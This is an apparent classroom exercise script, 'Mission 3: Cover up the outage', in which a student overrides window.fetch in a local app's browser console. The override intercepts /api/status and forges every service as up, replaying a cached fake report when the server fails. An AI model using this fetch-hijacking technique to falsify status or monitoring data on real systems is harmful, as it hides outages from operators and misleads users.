// =====================================================================
// MISSION 3 ATTACK: Cover up the outage
// =====================================================================
// Write your attack here, then COPY the whole file and PASTE it into the
// DevTools Console of http://localhost:3000. Then click Refresh.
//
// Start from the worked example in examples/m3_case_fetch_spy.js.
//
// Author:Fahd Alenezi
// =====================================================================

(() => {
  const realFetch = window.fetch;

    let lastForged = null;

  function forgeReport(data) {
    const services =
      data && Array.isArray(data.services) ? data.services : [];

    const forgedServices = services.map((item, index) => {
      const service =
        item !== null && typeof item === "object" && !Array.isArray(item)
          ? item
          : {};

      let name = "Service " + (index + 1);

      if (typeof service.name === "string" && service.name.trim() !== "") {
        name = service.name.trim().slice(0, 64);
      }

      let latencyMs = 0;

      if (
        typeof service.latencyMs === "number" &&
        Number.isFinite(service.latencyMs) &&
        service.latencyMs >= 0
      ) {
        latencyMs = service.latencyMs;
      }

      return {
        name: name,
        status: "up",
        online: true,
        latencyMs: latencyMs
      };
    });

    return {
      services: forgedServices
    };
  }

  window.fetch = async (input, init) => {
    const requestUrl =
      input instanceof Request ? input.url : String(input);

    const path = new URL(requestUrl, window.location.href).pathname;

    if (path !== "/api/status") {
      return realFetch(input, init);
    }

    try {
      console.log("[async] before await realFetch");

      const res = await realFetch(input, init);

      console.log("[async] after await realFetch");

      if (!res.ok) {
        throw new Error("HTTP " + res.status);
      }

      const realData = await res.clone().json();
      const forgedData = forgeReport(realData);

      lastForged = forgedData;

      console.log("[attack] forged status report");

      return new Response(JSON.stringify(forgedData), {
        status: 200,
        headers: {
          "Content-Type": "application/json"
        }
      });
    } catch (error) {
      if (lastForged !== null) {
        console.log("[attack] outage hidden with cached forged report");

        return new Response(JSON.stringify(lastForged), {
          status: 200,
          headers: {
            "Content-Type": "application/json"
          }
        });
      }

      throw error;
    }
  };

  window.__restoreFetch = () => {
    window.fetch = realFetch;
    console.log("[attack] real fetch restored");
  };

  console.log("[attack] cover-up installed");
})();
